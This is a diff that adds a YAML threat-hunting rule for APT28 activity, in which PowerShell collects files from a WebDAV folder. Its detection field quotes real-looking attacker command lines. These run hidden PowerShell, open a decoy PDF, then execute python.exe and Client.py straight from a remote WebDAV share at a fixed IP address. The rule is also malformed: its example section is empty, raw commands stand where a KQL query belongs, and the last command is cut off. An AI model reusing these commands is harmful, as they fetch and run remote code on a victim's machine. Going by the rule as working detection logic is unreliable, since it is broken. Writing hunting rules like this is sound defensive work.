@@ -1,0 +1,20 @@
+title: APT28 WebDav Folder File Collection
+id: ed6f43d1-063e-4de7-a7f4-1e27c983b9b7
+status: experimental
+level: medium
+description: |
+  Hunt for external connections initiated by PowerShell to collect files from the webdav folder. This is used to download malicious files.
+
+Example commandlines:
+author: Bert-JanP
+logsource:
+  product: microsoft_threat_hunting
+  service: kql
+detection:
+  _kql_query: |
+    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/231130N581.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/wody.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop  -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/StrategyUa.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe
+  condition: _kql_query
+references:
+  - https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules
